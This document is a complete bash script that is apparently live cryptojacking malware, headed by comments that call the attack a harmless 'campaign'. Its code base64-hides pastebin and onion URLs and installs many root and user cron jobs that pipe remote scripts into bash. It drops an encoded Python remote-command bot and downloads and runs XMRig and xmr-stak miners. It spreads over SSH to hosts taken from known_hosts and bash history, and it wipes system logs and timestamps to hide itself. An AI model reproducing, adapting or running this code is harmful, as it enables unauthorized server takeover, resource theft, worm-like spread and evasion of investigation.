#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
#This is the Old-ReBuild Lady job copy
#
#Goal:
# The goal of this campaign is as follows;
# - To keep the internet safe.
# - To keep them hackers from causing real damage to organisations.
# - We know you feel We are a potential threat, well We ain't.
# - We want to show how tiny vulns could lead to total disaters.
# - We know you feel We are Hypocrite's, because we mine. Well if we don't how the hell we gonna let you know we are in.
# - Please We plead to evey one out there don't sabotage this campaign (We want to keep the internet safe).
# - Sometimes you gotta break the rules to make them.
#
#Disclaimer:
#1) We only Wanna Mine.
#2) We don't want your data, or anything or even a ransom.
#3) Please if you find this code, don't post about it.
#4) We make your security better by breaking it.
#
#Contact:
#1) If your server get's infected:
# - We will provide cleanup script.
# - We will share source of entry into your servers and patch (surely).
# - Please if you contacting, please send your affected server's ip and services your run on the server.
# - lets talk jeff4r-partner@tutanota.com
#2) If you want to partner with us ?.
# - Well nothing to say.
#
#Note:
#1) We don't have access to Jeff4r190@tutanota.com anymore.


house=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0o2TmRWQkhxCg==|base64 -d)
room=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1JzNzhldWljCg==|base64 -d)
park=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3V3MDBwbTM5Cg==|base64 -d)
beam=$(echo aHR0cHM6Ly9hemlwbGNyNzJxamh6dmluLm9uaW9uLnRvL29sZC50eHQK|base64 -d)
deep=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1Y4NUw5WWFSCg==|base64 -d)
surf=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0VhaWFIWVNECg==|base64 -d)
ARCH=$(uname -m)
me=$( whoami )

function system() {
chattr -i /etc/crontab
rm -rf /bin/httpntp /bin/ftpsdns
cat /etc/crontab | grep -v "##" | grep -v "/bin/httpntp" | grep -v "/bin/ftpsdns" > /etc/crontab.bak && mv /etc/crontab.bak /etc/crontab
if [ ! -f "/bin/httpntp" ]; then
if [ ! -f "/bin/httpntp" ]; then
echo -e "(python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash\n##" > /bin/httpntp && chmod 755 /bin/httpntp
fi
if [ ! -f "/etc/crontab" ]; then
echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /bin/httpntp\n##" >> /etc/crontab
else
echo -e "0 1 * * * root /bin/httpntp" >> /etc/crontab
fi
fi
if [ ! -f "/bin/ftpsdns" ]; then
data1=$( (curl -fsSL $room||wget -q -O - $room) )
if [ ! -f "/bin/ftpsdns" ]; then
echo $data1 > /bin/ftpsdns && chmod 755 /bin/ftpsdns
fi
if [ ! -f "/etc/crontab" ]; then
echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n5 1 * * * root /bin/ftpsdns\n##" >> /etc/crontab
else
echo -e "5 1 * * * root /bin/ftpsdns" >> /etc/crontab
fi
fi
touch -acmr /bin/sh /etc/crontab
}

function dragon() {
nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKI3NpbXBsZSBodHRwX2JvdAppbXBvcnQgdXJsbGliCmltcG9ydCBiYXNlNjQKaW1wb3J0IG9zCgpkZWYgc29zKCk6CiAgICB1cmwgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzA1cDBmVFlkJwogICAgdHJ5OgogICAgICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3Blbih1cmwpLnJlYWQoKSkKICAgICAgICBmID0gb3MucG9wZW4oc3RyKHBhZ2UpKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KCdmYWlsZWQgdG8gZXhlY3V0ZSBvcyBjb21tYW5kJykKICAgICAgICBwYXNzCgpkZWYgcnVuU2NyaXB0KCk6CiAgICB1cmwgPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0t4V1BGZUVuJwogICAgdHJ5OgogICAgICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3Blbih1cmwpLnJlYWQoKSkKICAgICAgICBleGVjKHBhZ2UpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoJ2ZhaWxlZCB0byBleGVjdXRlIG9zIHB5dGhvbiBzY3JpcHQnKQogICAgICAgIHBhc3MKCmQ9ICdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvWDZ3dnV2OTgnCnRyeToKICAgIHBhZ2U9YmFzZTY0LmI2NGRlY29kZSh1cmxsaWIudXJsb3BlbihkKS5yZWFkKCkpCiAgICBpZiBwYWdlID09ICdvcyc6CiAgICAgICAgc29zKCkKICAgIGVsaWYgcGFnZSA9PSAnc2NyaXB0JzoKICAgICAgICBydW5TY3JpcHQoKQogICAgZWxzZToKICAgICAgICBwcmludCgnSSBjYW5cJ3QgdW5kZXJzdGFuZCB0aGUgYWN0aW9uIGFtIGdpdmVuJykKZXhjZXB0OgogICAgcHJpbnQoJ1NvcnJ5IGJvc3MgSSBjYW5cJ3QgZ2V0IGluc3RydWN0aW9ucycpCiAgICBwYXNzCg=='))" >/dev/null 2>&1 &
touch /tmp/.tmpk
}

function cronhigh() {
chattr -i /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root
rm -rf /etc/cron.hourly/oanacroane /etc/cron.daily/oanacroane /etc/cron.monthly/oanacroane
mkdir -p /var/spool/cron/crontabs
mkdir -p /etc/cron.hourly
mkdir -p /etc/cron.daily
mkdir -p /etc/cron.monthly
key=$( (curl -fsSL $house||wget -q -O - $house) )
echo -e "*/3 * * * * root (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash\n##" > /etc/cron.d/root
echo -e "*/6 * * * * root (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash\n##" > /etc/cron.d/system
echo -e "*/7 * * * * root (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash\n##" > /etc/cron.d/apache
echo -e "*/9 * * * * (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash\n##" > /var/spool/cron/root
echo -e "*/11 * * * * (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash\n##" > /var/spool/cron/crontabs/root
if [ ! -f "/etc/cron.hourly/oanacroane" ]; then
echo $key > /etc/cron.hourly/oanacroane && chmod 755 /etc/cron.hourly/oanacroane
fi
if [ ! -f "/etc/cron.daily/oanacroane" ]; then
echo $key > /etc/cron.daily/oanacroane && chmod 755 /etc/cron.daily/oanacroane
fi
if [ ! -f "/etc/cron.monthly/oanacroane" ]; then
echo $key > /etc/cron.monthly/oanacroane && chmod 755 /etc/cron.monthly/oanacroane
fi
touch -acmr /bin/sh /var/spool/cron/root
touch -acmr /bin/sh /var/spool/cron/crontabs/root
touch -acmr /bin/sh /etc/cron.d/system
touch -acmr /bin/sh /etc/cron.d/apache
touch -acmr /bin/sh /etc/cron.d/root
touch -acmr /bin/sh /etc/cron.hourly/oanacroane
touch -acmr /bin/sh /etc/cron.daily/oanacroane
touch -acmr /bin/sh /etc/cron.monthly/oanacroane
}

function cronlow() {
cr=$(crontab -l | grep -q "$house" | wc -l)
if [ ${cr} -eq 0 ];then
crontab -r
(crontab -l 2>/dev/null; echo "*/1 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash > /dev/null 2>&1")| crontab -
else
echo " "
fi
}

function cronbackup() {
pay="(curl -fsSL $house||wget -q -O- $house||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate)|bash"
status=0
crona=$(systemctl is-active cron)
cronb=$(systemctl is-active crond)
cronatd=$(systemctl is-active  atd)
if [ "$crona" == "active" ] ; then
echo "cron okay"
elif [ "$cronb" == "active"  ]; then
echo "cron okay"
elif [ "$cronatd" == "active" ] ; then
status=1
else
status=2
fi
if [ $status -eq 1 ] ; then
echo "Setting up atd backup"
for a in $(at -l|awk '{print $1}'); do at -r $a; done
echo "$pay" | at -m now + 1 minute
fi
if [ $status -eq 2 ] || [ "$me" != "root" ] ;then
echo "Setting up custom backup"
ps auxf|grep -v grep|grep "crun" | awk '{print $2}'|xargs kill -9
key="while true; do sleep 60 && $pay; done"
echo -e "$key\n##" > /tmp/crun && chmod 777 /tmp/crun && cd /tmp/
nohup ./crun >/dev/null 2>&1 &
sleep 15
rm /tmp/crun
fi
}

function gettarfile() {
base_path=$1
tar_url=$2
tar_flag=$3
output=$4
temp_path="/tmp/.tmpdropoff/"
if [ "$tar_flag" == "-xzvf" ];then
tar_out="/tmp/.tmpdropoff/rig.tar.gz"
rig_path="/tmp/.tmpdropoff/dataoutput/xmrig-2.14.1/xmrig-notls"
else
tar_out="/tmp/.tmpdropoff/rig.tar.xz"
rig_path="/tmp/.tmpdropoff/dataoutput/xmr-stak-linux-2.10.3-cpu/xmr-stak"
fi
mkdir -p $temp_path/dataoutput/
cd $temp_path
(curl -fsSL $tar_url -o $tar_out||wget -q $tar_url -O $tar_out)
tar $tar_flag $tar_out -C $temp_path/dataoutput/
mv $rig_path $output
cd $base_path
rm -rf $temp_path 
}

function download() {
mode=$1
pa=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${pa} -eq 0 ];then
mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjE0LjEveG1yaWctMi4xNC4xLXhlbmlhbC14NjQudGFyLmd6Cg==|base64 -d)
mi_32=$(echo aHR0cHM6Ly9waXhlbGRyYWluLmNvbS9hcGkvZmlsZS9adVZXY2VXRw==|base64 -d)
der_ke=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2hVUmRNQkxkCg==|base64 -d)
if [ "$mode" == "low" ]; then
path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
mkdir -p $path
rm -rf $path/*
chattr -i $path/*
else
path="/bin"
rm -rf $path/config.json $path/watchbog
fi
cd $path
if [ ! -f "$path/config.json" ]; then
con=$( (curl -fsSL $der_ke|| wget -q -O - $der_ke) )
echo $con | base64 -d > $path/config.json
fi
if [ "$ARCH" == "x86_64" ]; then
if [ ! -f "$path/watchbog" ]; then
gettarfile "$path" "$mi_64" "-xzvf" "$path/watchbog"
chmod 777 $path/watchbog
nohup ./watchbog >/dev/null 2>&1 &
else
nohup ./watchbog >/dev/null 2>&1 &
fi
elif [ "$ARCH" == "i686" ]; then
if [ ! -f "$path/watchbog" ]; then
(curl -fsSL $mi_32 -o $path/watchbog||wget $mi_32 -O $path/watchbog)
cat $path/watchbog| base64 -d > $path/watchbog.bak && mv $path/watchbog.bak $path/watchbog
chmod 777 $path/watchbog
nohup ./watchbog >/dev/null 2>&1 &
else
nohup ./watchbog >/dev/null 2>&1 &
fi
else
if [ ! -f "$path/watchbog" ]; then
gettarfile "$path" "$mi_64" "-xzvf" "$path/watchbog"
chmod 777 $path/watchbog
nohup ./watchbog >/dev/null 2>&1 &
else
nohup ./watchbog >/dev/null 2>&1 &
fi
fi
fi
}

function testa() {
mode=$1
pb=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${pb} -eq 0 ];then
st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL2ZpcmVpY2UtdWsveG1yLXN0YWsvcmVsZWFzZXMvZG93bmxvYWQvMi4xMC4zL3htci1zdGFrLWxpbnV4LTIuMTAuMy1jcHUudGFyLnh6Cg==|base64 -d)
con_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1lKSDhzV3JpCg==|base64 -d)
cpu_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2lyems1bVNoCg==|base64 -d)
poo_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2FKa2JUeDZZCg==|base64 -d)
if [ "$mode" == "low" ]; then
path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
mkdir -p $path
rm -rf $path/*
else
path="/bin"
rm -rf $path/config.json $path/watchbog $path/config.txt $path/cpu.txt $path/pools.txt
fi
cd $path
if [ ! -f "$path/config.txt" ]; then
(curl -fsSL $con_url -o $path/config.txt||wget $con_url -O $path/config.txt)
cat $path/config.txt| base64 -d > $path/config.txt.bak && mv $path/config.txt.bak $path/config.txt
chmod 777 $path/config.txt
fi
if [ ! -f "$path/cpu.txt" ]; then
(curl -fsSL $cpu_url -o $path/cpu.txt||wget $cpu_url -O $path/cpu.txt)
cat $path/cpu.txt| base64 -d > $path/cpu.txt.bak && mv $path/cpu.txt.bak $path/cpu.txt
chmod 777 $path/cpu.txt
fi
if [ ! -f "$path/pools.txt" ]; then
(curl -fsSL $poo_url -o $path/pools.txt||wget $poo_url -O $path/pools.txt)
cat $path/pools.txt| base64 -d > $path/pools.txt.bak && mv $path/pools.txt.bak $path/pools.txt
chmod 777 $path/pools.txt
fi
if [ "$ARCH" == "x86_64" ]; then
if [ ! -f "$path/watchbog" ]; then
gettarfile "$path" "$st_64" "-xf" "$path/watchbog"
chmod 777 $path/watchbog
nohup ./watchbog >/dev/null 2>&1 &
else
nohup ./watchbog >/dev/null 2>&1 &
fi
else
rm -rf $path/cpu.txt $path/pools.txt $path/config.txt 
fi
fi
}

function finished() {
mode=$1
if [ "$mode" == "low" ]; then
(curl -fsSL $deep || wget -q -O - $deep)
touch /tmp/.tmpc
else
(curl -fsSL $surf || wget -q -O - $surf)
touch /tmp/.tmpc
fi
}

function newpay() {
info=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzJ1bkppRDNiCg==|base64 -d)
update=$( (curl -fsSL $info|| wget -q -O - $info) )
if [ "$update" == "update" ];then
echo "An update exists boss"
else
echo "NO update exists boss"
fi
}

function cleanoldpack() {
ps auxf|grep -v grep|grep "watchbog" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "watchbug" | awk '{print $2}'|xargs kill -9
ps aux | grep -v '/boot/vmlinuz' | awk '{if($3>50.0) print $2}' | while read procid; do kill -9 $procid; done
rm -rf /tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/* /bin/watchbug
}

function moveon() {
cleanoldpack
path0="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
path1="/bin"
declare -a arr0=("$path0/config.json" "$path0/pools.txt" "$path1/config.json" "$path1/pools.txt")
for check in "${arr0[@]}"
do
if [  -f $check ]; then
echo "$check file exist"
way=$(cat $check | grep "44gaihcvA4DHwaWoKgVWyuKXNpuY2fAkKbByPCASosAw6XcrVtQ4VwdHMzoptXVHJwEErbds66L9iWN6dRPNZJCqDhqni3B" | wc -l)
if [ ${way} -ne 0 ];then
echo "cleaning up file $check"
rm -rf $check
cleanoldpack
fi
fi
done
}

function party() {
for h in $(cat /root/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.bash_history /home/*/.bash_history|grep -v "127.0.0.1"|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|sort|uniq); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/P0RmTqai||wget -q -O- https://pastebin.com/raw/P0RmTqai)|bash >/dev/null 2>&1 &' & done
touch /tmp/.wwwwwwweeeeeeeeeeepaasss
}

if [  -f "/tmp/.wwwwwwweeeeeeeeeeepaasss" ]; then
rm /tmp/.wwwwwwweeeeeeeeeeepaasss
fi
echo "I am $me"
if [ "$me" != "root" ];then
pz=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${pz} -ne 0 ];then
echo "It's running boss"
crontab -r 
cronlow
else
download "low"
crontab -r
cronlow
sleep 15
pm=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${pm} -eq 0 ];then
testa "low"
fi
prt=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${prt} -ne 0 ];then
if [ ! -f "/tmp/.tmpc" ]; then
finished "low"
fi
fi
fi
fi
if [ "$me" == "root" ];then
pz=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${pz} -ne 0 ];then
echo "It's running boss"
system
cronhigh
else
echo "Setting Up Sys Cron"
system
cronhigh
download "high"
sleep 15
pm=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
if [ ${pm} -ne 0 ];then
if [ ! -f "/tmp/.tmpc" ]; then
finished "high"
fi
fi
sleep 30
if [ ${pm} -eq 0 ];then
testa "high"
if [ ${pm} -ne 0 ];then
finished "high"
fi
fi
if [ ${pm} -eq 0 ];then
download "low"
if [ ${pm} -ne 0 ];then
finished "low"
fi
fi
if [ ${pm} -eq 0 ];then
testa "low"
if [ ${pm} -ne 0 ];then
finished "low"
fi
fi
fi
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
sed -i '/pastebin/d' /var/log/syslog 
sed -i '/github/d' /var/log/syslog 
fi
#
cronbackup
#
#
